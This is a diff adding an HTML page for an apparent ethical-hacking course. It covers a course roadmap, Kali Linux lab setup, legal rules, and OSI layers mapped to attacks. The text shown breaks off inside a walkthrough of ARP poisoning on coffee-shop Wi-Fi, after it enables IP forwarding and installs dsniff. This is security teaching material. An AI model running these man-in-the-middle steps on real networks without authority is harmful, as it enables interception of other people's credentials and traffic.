@@ -1,0 +1,2046 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EthHack Academy — Full Course Content</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#080b0f;--bg2:#0d1117;--surface:#161d27;--surface2:#1c2535;
+  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.13);
+  --text:#e2e8f0;--muted:#64748b;--dim:#94a3b8;
+  --green:#00ff88;--gdim:rgba(0,255,136,0.12);--gglow:rgba(0,255,136,0.2);
+  --amber:#f59e0b;--adim:rgba(245,158,11,0.1);
+  --red:#ef4444;--rdim:rgba(239,68,68,0.1);
+  --blue:#3b82f6;--bdim:rgba(59,130,246,0.1);
+  --purple:#a855f7;--pdim:rgba(168,85,247,0.1);
+  --cyan:#06b6d4;--cdim:rgba(6,182,212,0.1);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;display:flex;min-height:100vh}
+a{color:inherit;text-decoration:none}
+code,pre,kbd,.mono{font-family:'JetBrains Mono',monospace}
+
+/* SIDEBAR */
+#sidebar{
+  width:280px;min-width:280px;height:100vh;position:sticky;top:0;
+  background:var(--bg2);border-right:1px solid var(--border);
+  overflow-y:auto;display:flex;flex-direction:column;z-index:50;
+}
+#sidebar::-webkit-scrollbar{width:4px}
+#sidebar::-webkit-scrollbar-track{background:transparent}
+#sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.sb-header{padding:1.25rem 1rem;border-bottom:1px solid var(--border);}
+.sb-logo{display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.sb-icon{width:28px;height:28px;background:var(--green);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#000}
+.sb-name{font-size:14px;font-weight:800;letter-spacing:.02em}
+.sb-sub{font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace}
+.sb-progress{margin-top:.75rem;height:3px;background:var(--surface2);border-radius:2px}
+.sb-bar{height:3px;background:var(--green);border-radius:2px;width:100%}
+.sb-pct{font-size:10px;color:var(--green);font-family:'JetBrains Mono',monospace;margin-top:4px}
+.sb-phase{padding:.5rem 1rem;font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);border-top:1px solid var(--border);margin-top:.5rem}
+.sb-link{display:flex;align-items:center;gap:8px;padding:.45rem 1rem;cursor:pointer;transition:background .15s;font-size:12px;color:var(--dim);}
+.sb-link:hover{background:var(--surface);color:var(--text)}
+.sb-link.active{background:var(--gdim);color:var(--green)}
+.sb-check{font-size:10px;width:16px;text-align:center;flex-shrink:0}
+.sb-link span{font-size:11px}
+
+/* MAIN */
+#main{flex:1;overflow-y:auto;padding:0}
+#main::-webkit-scrollbar{width:4px}
+#main::-webkit-scrollbar-track{background:transparent}
+#main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+
+/* CHAPTER PAGES */
+.chapter{display:none;padding:3rem 3rem 5rem;max-width:900px}
+.chapter.active{display:block}
+
+/* HERO CHAPTER */
+#ch-home{display:block;padding:0;max-width:100%}
+.home-hero{
+  min-height:100vh;display:flex;flex-direction:column;justify-content:center;
+  padding:4rem 3rem;position:relative;overflow:hidden;
+}
+.hgrid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
+.hglow{position:absolute;top:-150px;left:40%;width:700px;height:500px;background:radial-gradient(ellipse,rgba(0,255,136,.07) 0%,transparent 70%);pointer-events:none}
+.home-inner{max-width:800px;position:relative}
+.eyebrow{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--green);letter-spacing:.15em;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:10px}
+.eyebrow::before{content:'';display:block;width:30px;height:1px;background:var(--green)}
+.hero-h1{font-size:clamp(2.5rem,5vw,4.5rem);font-weight:800;line-height:1.05;letter-spacing:-.03em;margin-bottom:1rem}
+.hero-h1 em{color:var(--green);font-style:normal}
+.hero-p{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--dim);line-height:1.8;max-width:520px;margin-bottom:2.5rem}
+.stats{display:flex;gap:2.5rem;flex-wrap:wrap;margin-bottom:2.5rem}
+.stat .n{font-size:2rem;font-weight:800;color:var(--green);letter-spacing:-.03em}
+.stat .l{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-top:2px}
+.start-btn{display:inline-flex;align-items:center;gap:8px;background:var(--green);color:#000;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;padding:10px 22px;border-radius:7px;cursor:pointer;border:none;transition:all .2s;letter-spacing:.05em}
+.start-btn:hover{background:#00e87a;box-shadow:0 6px 24px var(--gglow)}
+
+/* CHAPTER HEADER */
+.ch-header{margin-bottom:2.5rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}
+.ch-phase{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:3px 10px;border-radius:4px;display:inline-block;margin-bottom:.75rem}
+.ph1{background:var(--bdim);color:var(--blue);border:1px solid rgba(59,130,246,.25)}
+.ph2{background:var(--adim);color:var(--amber);border:1px solid rgba(245,158,11,.25)}
+.ph3{background:var(--pdim);color:var(--purple);border:1px solid rgba(168,85,247,.25)}
+.ph-adv{background:var(--rdim);color:var(--red);border:1px solid rgba(239,68,68,.25)}
+.ch-title{font-size:2rem;font-weight:800;letter-spacing:-.02em;margin-bottom:.5rem}
+.ch-sub{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);line-height:1.7}
+
+/* 5Q BLOCK */
+.fiveq{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;margin:1.5rem 0}
+.q-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.85rem}
+.q-letter{font-size:1.4rem;font-weight:800;color:var(--green);margin-bottom:4px}
+.q-label{font-size:12px;font-weight:700;margin-bottom:6px}
+.q-text{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.5}
+
+/* SECTION TITLE */
+.sec{margin:2.5rem 0 .75rem}
+.sec h2{font-size:1.2rem;font-weight:800;display:flex;align-items:center;gap:.6rem}
+.sec h2::before{content:'//';font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--green);font-weight:400}
+.sec h3{font-size:1rem;font-weight:700;color:var(--dim);margin-top:1.5rem;margin-bottom:.5rem;padding-left:1rem;border-left:2px solid var(--green)}
+
+/* PROSE */
+p{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--dim);line-height:1.8;margin-bottom:1rem}
+p strong{color:var(--text);font-weight:500}
+ul.prose,ol.prose{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--dim);line-height:1.9;padding-left:1.5rem;margin-bottom:1rem}
+ul.prose li::marker{color:var(--green)}
+ol.prose li::marker{color:var(--green);font-weight:700}
+
+/* CODE BLOCKS */
+.code-block{background:#000;border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:1.25rem 0;font-size:12px}
+.code-bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;align-items:center;gap:8px}
+.dot{width:10px;height:10px;border-radius:50%}
+.code-lang{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);margin-left:auto;text-transform:uppercase;letter-spacing:.08em}
+.code-body{padding:1.25rem;overflow-x:auto;line-height:1.85}
+.code-body::-webkit-scrollbar{height:3px}
+.code-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.cm{color:#4a5568}
+.ck{color:#f472b6}
+.cv{color:#fb923c}
+.cs{color:#a3e635}
+.co{color:var(--green)}
+.cb{color:#60a5fa}
+.cn{color:#fbbf24}
+.cw{color:#e2e8f0}
+
+/* CALLOUT BOXES */
+.callout{border-radius:8px;padding:1rem 1.25rem;margin:1.25rem 0;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.75;border-left:3px solid}
+.callout-title{font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.4rem}
+.warn{background:rgba(245,158,11,.08);border-color:var(--amber);color:#fcd34d}
+.warn .callout-title{color:var(--amber)}
+.danger{background:rgba(239,68,68,.08);border-color:var(--red);color:#fca5a5}
+.danger .callout-title{color:var(--red)}
+.info{background:rgba(59,130,246,.08);border-color:var(--blue);color:#93c5fd}
+.info .callout-title{color:var(--blue)}
+.success{background:rgba(0,255,136,.08);border-color:var(--green);color:#6ee7b7}
+.success .callout-title{color:var(--green)}
+
+/* ATTACK SCENARIO */
+.scenario{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.5rem;margin:1.5rem 0}
+.scenario-header{display:flex;align-items:center;gap:8px;margin-bottom:1rem}
+.scenario-badge{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;padding:3px 9px;border-radius:4px;text-transform:uppercase;letter-spacing:.1em;background:var(--rdim);color:var(--red);border:1px solid rgba(239,68,68,.25)}
+.scenario-title{font-size:14px;font-weight:700}
+
+/* TABLE */
+.tbl{width:100%;border-collapse:collapse;margin:1.25rem 0;font-family:'JetBrains Mono',monospace;font-size:11px}
+.tbl th{text-align:left;padding:8px 12px;background:var(--surface);border:1px solid var(--border);color:var(--green);font-weight:700;font-size:10px;text-transform:uppercase;letter-spacing:.08em}
+.tbl td{padding:8px 12px;border:1px solid var(--border);color:var(--dim);vertical-align:top;line-height:1.6}
+.tbl tr:hover td{background:var(--surface)}
+
+/* QUIZ */
+.quiz{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.5rem;margin:2rem 0}
+.quiz-title{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--green);text-transform:uppercase;letter-spacing:.1em;margin-bottom:1rem;font-weight:700}
+.quiz-q{font-size:13px;font-weight:700;margin-bottom:.75rem}
+.quiz-a{display:none;background:var(--gdim);border:1px solid rgba(0,255,136,.2);border-radius:6px;padding:.85rem;font-family:'JetBrains Mono',monospace;font-size:12px;color:#6ee7b7;line-height:1.7;margin-top:.5rem}
+.quiz-btn{font-family:'JetBrains Mono',monospace;font-size:11px;background:transparent;color:var(--green);border:1px solid rgba(0,255,136,.3);padding:5px 12px;border-radius:5px;cursor:pointer;transition:all .2s}
+.quiz-btn:hover{background:var(--gdim)}
+
+/* LAB */
+.lab{background:linear-gradient(135deg,rgba(0,255,136,.05),rgba(59,130,246,.05));border:1px solid rgba(0,255,136,.2);border-radius:10px;padding:1.5rem;margin:1.5rem 0}
+.lab-header{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--green);text-transform:uppercase;letter-spacing:.1em;font-weight:700;margin-bottom:.75rem;display:flex;align-items:center;gap:6px}
+.lab-title{font-size:14px;font-weight:700;margin-bottom:.75rem}
+.lab ol{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--dim);padding-left:1.5rem;line-height:2}
+.lab ol li::marker{color:var(--green);font-weight:700}
+
+/* NEXT/PREV NAV */
+.ch-nav{display:flex;gap:12px;margin-top:3rem;padding-top:2rem;border-top:1px solid var(--border)}
+.nav-btn{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:1rem;cursor:pointer;transition:all .2s;text-align:left}
+.nav-btn:hover{background:var(--surface2);border-color:var(--border2)}
+.nav-btn.next{text-align:right}
+.nav-dir{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px}
+.nav-name{font-size:13px;font-weight:700;color:var(--text)}
+
+/* INLINE CODE */
+.ic{font-family:'JetBrains Mono',monospace;font-size:11px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:1px 6px;color:var(--cyan)}
+
+/* RESPONSIVE */
+@media(max-width:900px){
+  #sidebar{display:none}
+  .chapter{padding:2rem 1.5rem 4rem}
+  .home-hero{padding:2rem 1.5rem}
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="sb-header">
+    <div class="sb-logo">
+      <div class="sb-icon">&gt;_</div>
+      <span class="sb-name">EthHack Academy</span>
+    </div>
+    <div class="sb-sub">// Ethical Hacking · Full Content</div>
+    <div class="sb-progress"><div class="sb-bar"></div></div>
+    <div class="sb-pct">18 / 18 Chapters Complete</div>
+  </div>
+
+  <div class="sb-link" onclick="show('ch-home')" id="nav-ch-home"><span class="sb-check">🏠</span><span>Home</span></div>
+
+  <div class="sb-phase">Phase 1 — Foundations</div>
+  <div class="sb-link" onclick="show('ch00')" id="nav-ch00"><span class="sb-check">✅</span><span>Ch 00 — Overview & Roadmap</span></div>
+  <div class="sb-link" onclick="show('ch01')" id="nav-ch01"><span class="sb-check">✅</span><span>Ch 01 — OSI Model</span></div>
+  <div class="sb-link" onclick="show('ch02')" id="nav-ch02"><span class="sb-check">✅</span><span>Ch 02 — TCP/IP & Ports</span></div>
+  <div class="sb-link" onclick="show('ch03')" id="nav-ch03"><span class="sb-check">✅</span><span>Ch 03 — Linux Architecture</span></div>
+  <div class="sb-link" onclick="show('ch04')" id="nav-ch04"><span class="sb-check">✅</span><span>Ch 04 — Filesystem & Dirs</span></div>
+  <div class="sb-link" onclick="show('ch05')" id="nav-ch05"><span class="sb-check">✅</span><span>Ch 05 — Permissions & PrivEsc</span></div>
+  <div class="sb-link" onclick="show('ch06')" id="nav-ch06"><span class="sb-check">✅</span><span>Ch 06 — 50 Linux Commands</span></div>
+  <div class="sb-link" onclick="show('ch07')" id="nav-ch07"><span class="sb-check">✅</span><span>Ch 07 — Bash Scripting</span></div>
+
+  <div class="sb-phase">Phase 2 — Web & Network</div>
+  <div class="sb-link" onclick="show('ch08')" id="nav-ch08"><span class="sb-check">✅</span><span>Ch 08 — Python for Security</span></div>
+  <div class="sb-link" onclick="show('ch09')" id="nav-ch09"><span class="sb-check">✅</span><span>Ch 09 — Web & HTTP</span></div>
+  <div class="sb-link" onclick="show('ch10')" id="nav-ch10"><span class="sb-check">✅</span><span>Ch 10 — OWASP Top 10</span></div>
+  <div class="sb-link" onclick="show('ch11')" id="nav-ch11"><span class="sb-check">✅</span><span>Ch 11 — Burp Suite</span></div>
+  <div class="sb-link" onclick="show('ch12')" id="nav-ch12"><span class="sb-check">✅</span><span>Ch 12 — Wi-Fi Security</span></div>
+
+  <div class="sb-phase">Phase 3 — Advanced</div>
+  <div class="sb-link" onclick="show('ch13')" id="nav-ch13"><span class="sb-check">✅</span><span>Ch 13 — Pentest & OSINT</span></div>
+  <div class="sb-link" onclick="show('ch14')" id="nav-ch14"><span class="sb-check">✅</span><span>Ch 14 — Cryptography</span></div>
+  <div class="sb-link" onclick="show('ch15')" id="nav-ch15"><span class="sb-check">✅</span><span>Ch 15 — Digital Forensics</span></div>
+  <div class="sb-link" onclick="show('ch16')" id="nav-ch16"><span class="sb-check">✅</span><span>Ch 16 — CTF Strategy</span></div>
+  <div class="sb-link" onclick="show('ch17')" id="nav-ch17"><span class="sb-check">✅</span><span>Ch 17 — Bug Bounty</span></div>
+  <div class="sb-link" onclick="show('ch18')" id="nav-ch18"><span class="sb-check">✅</span><span>Ch 18 — Career & Certs</span></div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main id="main">
+
+<!-- HOME -->
+<div class="chapter active" id="ch-home">
+<div class="home-hero">
+  <div class="hgrid"></div><div class="hglow"></div>
+  <div class="home-inner">
+    <div class="eyebrow">Complete Ethical Hacking Course</div>
+    <h1 class="hero-h1">Master<br><em>Ethical Hacking</em><br>From Zero.</h1>
+    <p class="hero-p">Real content. Real code. Real attack scenarios. Not a syllabus — actual teaching material for every chapter across all 3 phases. Apply the 5-Question Framework to everything.</p>
+    <div class="stats">
+      <div class="stat"><div class="n">18</div><div class="l">Chapters</div></div>
+      <div class="stat"><div class="n">3</div><div class="l">Phases</div></div>
+      <div class="stat"><div class="n">26</div><div class="l">Weeks</div></div>
+      <div class="stat"><div class="n">100%</div><div class="l">Complete</div></div>
+    </div>
+    <button class="start-btn" onclick="show('ch00')">→ Start with Chapter 00</button>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 00 ═══════════════ -->
+<div class="chapter" id="ch00">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 00 — Course Overview & Roadmap</h1>
+  <p class="ch-sub">The 5-Question Framework · Lab Setup · Legal Rules · Certification Track</p>
+</div>
+
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Without a structured roadmap, learners bounce between random YouTube videos and never build real depth. This chapter gives you the mental model to absorb everything that follows.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Content</div><div class="q-text">A 6-month structured curriculum, the 5Q teaching framework, lab setup guide, and the legal boundaries of ethical hacking.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Application</div><div class="q-text">Every single chapter uses this framework. Understanding it first means you can extract value from any resource, not just this course.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">Before touching any tool. Mental models first, then mechanics. Most beginners skip this — that's exactly why they struggle.</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Anyone entering security — job seekers, bug bounty hunters, CTF players, or curious defenders who want to understand the attacker mindset.</div></div>
+</div>
+
+<div class="sec"><h2>The 5-Question Master Framework</h2></div>
+<p>Before explaining any concept, command, or tool, you MUST answer 5 questions. This is non-negotiable. Surface-level knowledge gets you nowhere in security. You need to understand <strong>why a vulnerability exists</strong>, not just how to exploit it.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Framework</span></div>
+<div class="code-body">
+<span class="cm">╔══════════════════════════════════════════════════════════╗</span><br>
+<span class="cm">║          THE 5-QUESTION MASTER FRAMEWORK                 ║</span><br>
+<span class="cm">╠══════════════════════════════════════════════════════════╣</span><br>
+<span class="co">║  WHY     ─</span> <span class="cw">Why does this exist? Why should I care?         </span><span class="co">║</span><br>
+<span class="co">║  WHAT    ─</span> <span class="cw">What is it at the deepest internal level?        </span><span class="co">║</span><br>
+<span class="co">║  WHERE   ─</span> <span class="cw">Where does it appear in real systems/attacks?    </span><span class="co">║</span><br>
+<span class="co">║  WHEN    ─</span> <span class="cw">When do attackers use it? When do defenders care? </span><span class="co">║</span><br>
+<span class="co">║  TO WHOM ─</span> <span class="cw">Who needs this skill and why?                    </span><span class="co">║</span><br>
+<span class="cm">╚══════════════════════════════════════════════════════════╝</span><br>
+<br>
+<span class="cm">After answering all 5:</span><br>
+<span class="cv">  1.</span> <span class="cw">Deep conceptual explanation (internals, not surface)</span><br>
+<span class="cv">  2.</span> <span class="cw">Real-world attack scenario (specific, detailed, realistic)</span><br>
+<span class="cv">  3.</span> <span class="cw">Step-by-step commands with inline comments on every line</span><br>
+<span class="cv">  4.</span> <span class="cw">Defense / Blue Team angle</span><br>
+<span class="cv">  5.</span> <span class="cw">Hands-on lab exercise</span><br>
+<span class="cv">  6.</span> <span class="cw">Quiz questions with detailed answers</span>
+</div></div>
+
+<div class="sec"><h2>Lab Setup — VirtualBox + Kali Linux</h2></div>
+<p>Your lab is your sandbox. <strong>Never practice on systems you don't own</strong>. Every technique in this course must be practiced in an isolated environment first.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># ── STEP 1: Download VirtualBox (free hypervisor) ─────────────────</span><br>
+<span class="cm"># https://www.virtualbox.org/wiki/Downloads</span><br>
+<span class="cm"># Install for your host OS (Windows/Mac/Linux)</span><br>
+<br>
+<span class="cm"># ── STEP 2: Download Kali Linux VM Image ──────────────────────────</span><br>
+<span class="cm"># https://www.kali.org/get-kali/#kali-virtual-machines</span><br>
+<span class="cm"># Download the VirtualBox .ova file (pre-built, saves hours)</span><br>
+<br>
+<span class="cm"># ── STEP 3: Import the OVA into VirtualBox ────────────────────────</span><br>
+<span class="cm"># File → Import Appliance → Select the .ova → Import</span><br>
+<br>
+<span class="cm"># ── STEP 4: Configure Network Settings ───────────────────────────</span><br>
+<span class="cm"># Settings → Network → Adapter 1 → NAT (internet access)</span><br>
+<span class="cm"># Settings → Network → Adapter 2 → Host-Only (talk to other VMs)</span><br>
+<br>
+<span class="cm"># ── STEP 5: First boot, update everything ─────────────────────────</span><br>
+<span class="ck">sudo</span> <span class="cv">apt update</span> <span class="cm"># refresh package lists</span><br>
+<span class="ck">sudo</span> <span class="cv">apt upgrade -y</span> <span class="cm"># upgrade all installed packages</span><br>
+<span class="ck">sudo</span> <span class="cv">apt install -y</span> gobuster ffuf nuclei subfinder <span class="cm"># add missing tools</span><br>
+<br>
+<span class="cm"># ── STEP 6: Take a snapshot BEFORE any practice ───────────────────</span><br>
+<span class="cm"># Machine → Take Snapshot → "Clean State"</span><br>
+<span class="cm"># Restore this if anything breaks — your safety net</span><br>
+<br>
+<span class="cm"># ── Default Kali credentials ──────────────────────────────────────</span><br>
+<span class="cs">Username: kali</span><br>
+<span class="cs">Password: kali</span><br>
+<span class="cm"># Change immediately: passwd</span>
+</div></div>
+
+<div class="callout warn"><div class="callout-title">⚠ Legal Golden Rules — Non-Negotiable</div>
+1. Never scan, probe, or attack systems without explicit written permission<br>
+2. "I was just testing" is not a legal defence<br>
+3. Even public-facing systems require authorisation to pentest<br>
+4. Use TryHackMe, HackTheBox, PortSwigger Academy, or your own VMs<br>
+5. Bug bounty — stay strictly within defined scope. Out-of-scope = illegal.
+</div>
+
+<div class="sec"><h2>6-Month Structured Roadmap</h2></div>
+<table class="tbl">
+<tr><th>Month</th><th>Focus</th><th>Chapters</th><th>Certification Target</th></tr>
+<tr><td>Month 1</td><td>Networking + Linux Foundations</td><td>Ch 00–04</td><td>Study CompTIA Network+</td></tr>
+<tr><td>Month 2</td><td>Linux Mastery + Scripting</td><td>Ch 05–07</td><td>Study CompTIA Security+</td></tr>
+<tr><td>Month 3</td><td>Web Technologies + OWASP</td><td>Ch 08–10</td><td>Start PortSwigger Web Academy</td></tr>
+<tr><td>Month 4</td><td>Tools + Wi-Fi + Methodology</td><td>Ch 11–13</td><td>Prep for eJPT</td></tr>
+<tr><td>Month 5</td><td>Crypto + Forensics + CTF</td><td>Ch 14–16</td><td>Take eJPT exam</td></tr>
+<tr><td>Month 6</td><td>Bug Bounty + Career</td><td>Ch 17–18</td><td>OSCP prep begins</td></tr>
+</table>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 00</div>
+  <div class="quiz-q">Q1: Why do we answer 5 questions before explaining any concept?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">Because surface-level knowledge ("run this command") breaks the moment the environment changes. Understanding WHY a tool works means you can adapt it, debug it, and apply it in contexts the tutorial never covered. Security is about understanding systems deeply — not memorising commands.</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: What is the difference between a vulnerability and a threat?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">A <strong>vulnerability</strong> is a weakness in a system (e.g. unpatched SQL injection flaw). A <strong>threat</strong> is a potential for harm — something or someone that might exploit the vulnerability (e.g. a malicious actor). A <strong>risk</strong> is vulnerability × threat × impact. You can have a vulnerability with no threat (low risk) or a threat targeting a patched system (zero risk).</div>
+</div>
+
+<div class="ch-nav">
+  <div></div>
+  <div class="nav-btn next" onclick="show('ch01')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 01 — Networking & OSI Model</div></div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 01 ═══════════════ -->
+<div class="chapter" id="ch01">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 01 — Networking & OSI Model</h1>
+  <p class="ch-sub">All 7 Layers · Attack Relevance Per Layer · ARP Poisoning · SYN Flood · SSRF</p>
+</div>
+
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Every attack travels through these layers. If you don't know which layer you're operating at, you can't understand why your tool works or why it fails.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">The OSI model is a 7-layer conceptual framework that describes how data moves from one machine to another across a network — from raw bits to application data.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">In every network packet you capture, every firewall rule, every WAF bypass, every ARP table, every TLS handshake. Networking IS hacking.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">Attackers operate at specific layers intentionally. ARP poisoning = L2. IP spoofing = L3. TCP session hijacking = L4. HTTPS stripping = L6. SQLi = L7.</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Essential for every security role — pentesters, network defenders, SOC analysts, bug bounty hunters. Without this, you're guessing.</div></div>
+</div>
+
+<div class="sec"><h2>All 7 OSI Layers — Deep Internals</h2></div>
+<p>The OSI (Open Systems Interconnection) model splits network communication into 7 distinct layers. Data travels <strong>down</strong> the stack on the sender and <strong>up</strong> the stack on the receiver — each layer wraps the data with its own header (encapsulation). Here's each layer with its real attack surface:</p>
+
+<table class="tbl">
+<tr><th>Layer</th><th>Name</th><th>PDU</th><th>Protocols</th><th>Attack Surface</th></tr>
+<tr><td>7</td><td>Application</td><td>Data</td><td>HTTP, DNS, FTP, SMTP</td><td>SQLi, XSS, SSRF, Command Injection</td></tr>
+<tr><td>6</td><td>Presentation</td><td>Data</td><td>SSL/TLS, JPEG, ASCII</td><td>SSL stripping, encoding attacks, XXE</td></tr>
+<tr><td>5</td><td>Session</td><td>Data</td><td>NetBIOS, RPC, SMB</td><td>Session fixation, cookie theft, replay</td></tr>
+<tr><td>4</td><td>Transport</td><td>Segment</td><td>TCP, UDP</td><td>SYN flood, TCP hijacking, port scanning</td></tr>
+<tr><td>3</td><td>Network</td><td>Packet</td><td>IP, ICMP, OSPF</td><td>IP spoofing, SSRF (169.254.169.254), route injection</td></tr>
+<tr><td>2</td><td>Data Link</td><td>Frame</td><td>Ethernet, ARP, MAC</td><td>ARP poisoning, MAC flooding, VLAN hopping</td></tr>
+<tr><td>1</td><td>Physical</td><td>Bit</td><td>Ethernet cable, Wi-Fi RF</td><td>Cable tapping, rogue AP, signal jamming</td></tr>
+</table>
+
+<div class="sec"><h3>Encapsulation — How Data Actually Travels</h3></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Concept</span></div>
+<div class="code-body">
+<span class="cm"># SENDER SIDE — data wraps as it goes DOWN the stack</span><br>
+<span class="co">L7 App Data:</span>     <span class="cs">"GET /login HTTP/1.1\r\nHost: target.com"</span><br>
+<span class="co">L4 TCP Segment:</span>  <span class="cs">[SRC:54321 DST:443 SEQ:1000 ACK:0]</span> + App Data<br>
+<span class="co">L3 IP Packet:</span>    <span class="cs">[SRC:192.168.1.5 DST:93.184.216.34]</span> + TCP Seg<br>
+<span class="co">L2 Ethernet Frame:</span><span class="cs">[SRC-MAC:aa:bb:cc DST-MAC:ff:ee:dd]</span> + IP Packet<br>
+<span class="co">L1 Bits:</span>         <span class="cs">0101110011010100110010...</span> (raw electrical signal)<br>
+<br>
+<span class="cm"># RECEIVER SIDE — headers stripped as it goes UP the stack</span><br>
+<span class="cm"># Each layer reads its header, strips it, passes payload up</span><br>
+<span class="cm"># L7 application finally sees: "GET /login HTTP/1.1"</span>
+</div></div>
+
+<div class="sec"><h2>Layer 2 Attack: ARP Poisoning (Man-in-the-Middle)</h2></div>
+<p><strong>ARP (Address Resolution Protocol)</strong> maps IP addresses to MAC addresses. It has <strong>no authentication</strong> — any machine can broadcast fake ARP replies. This is the foundation of LAN-based man-in-the-middle attacks.</p>
+
+<div class="scenario">
+  <div class="scenario-header"><span class="scenario-badge">Real Attack</span><div class="scenario-title">Coffee Shop MITM — ARP Poisoning to Capture Credentials</div></div>
+  <p style="margin:0 0 .75rem">Attacker sits in a coffee shop on the same Wi-Fi as the victim. The router is at 192.168.1.1. The victim is at 192.168.1.100. The attacker poisons both ARP caches — the router thinks the attacker IS the victim, and the victim thinks the attacker IS the router. All traffic flows through the attacker.</p>
+</div>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Lab Only, Authorised Network</span></div>
+<div class="code-body">
+<span class="cm"># ── Enable IP forwarding so traffic passes through us ─────────────</span><br>
+<span class="ck">echo</span> <span class="cs">1</span> &gt; /proc/sys/net/ipv4/ip_forward<br>
+<span class="cm"># Without this, traffic stops at us — victim loses internet (obvious)</span><br>
+<br>
+<span class="cm"># ── Install arpspoof (part of dsniff package) ─────────────────────</span><br>
+<span class="ck">sudo</span> apt install -y dsniff<br>
+<br>
+<span class="cm"># ── Tell the VICTIM (192.168.1.100) that WE are the ROUTER ────────</span><br>
